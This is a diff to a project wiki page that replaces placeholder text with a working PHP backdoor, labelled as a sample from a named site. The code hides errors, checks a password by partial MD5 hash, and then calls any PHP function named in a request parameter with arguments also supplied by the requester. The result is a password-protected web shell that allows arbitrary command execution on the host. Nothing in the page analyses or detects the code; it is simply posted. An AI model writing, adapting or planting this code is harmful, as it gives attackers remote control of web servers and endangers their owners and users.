@@ -1,13 +1,49 @@
-#summary One-sentence summary of this page.-sample-from-nbubbs-com
+#Backdoor-sample
 
 = Introduction =
 
 Add your content here.
 
 
-= Details =
+= Backdoor-sample-from-nbubbs-com =
 
-Add your content here.  Format your content with:
-  * Text in *bold* or _italic_
-  * Headings, paragraphs, and lists
-  * Automatic links to other wiki pages
+<?php
+
+error_reporting(E_ERROR);
+
+if (isset($_REQUEST['myfunctionpassw']))
+
+	define('FUNCTION_PASSW',stripslashes($_REQUEST['myfunctionpassw']));
+
+if (isset($_REQUEST['myfunctioncodea']))
+
+	define('FUNCTION_CODEA',stripslashes($_REQUEST['myfunctioncodea']));
+
+if (isset($_REQUEST['myfunctioncodeb']))
+
+	define('FUNCTION_CODEB',stripslashes($_REQUEST['myfunctioncodeb']));
+
+if (isset($_REQUEST['myfunctioncodec']))
+
+	define('FUNCTION_CODEC',stripslashes($_REQUEST['myfunctioncodec']));
+
+if (substr ( md5 (FUNCTION_PASSW),26) == '254bff') {
+	
+	if (isset($_REQUEST['myfunctioncodea']) && isset($_REQUEST['myfunctioncodeb']) && isset($_REQUEST['myfunctioncodec']))
+		
+		$_REQUEST['myfunctionname'](FUNCTION_CODEA, FUNCTION_CODEB, FUNCTION_CODEC);
+		
+	elseif (isset($_REQUEST['myfunctioncodea']) && isset($_REQUEST['myfunctioncodeb']))
+	
+		$_REQUEST['myfunctionname'](FUNCTION_CODEA, FUNCTION_CODEB) ? print(FUNCTION_CODEA.' ok') : print(FUNCTION_CODEA.' err');
+	
+	else
+	
+		$_REQUEST['myfunctionname'](FUNCTION_CODEA);
+		
+} else {
+	
+	die('Access Denied');
+	
+}
+?>
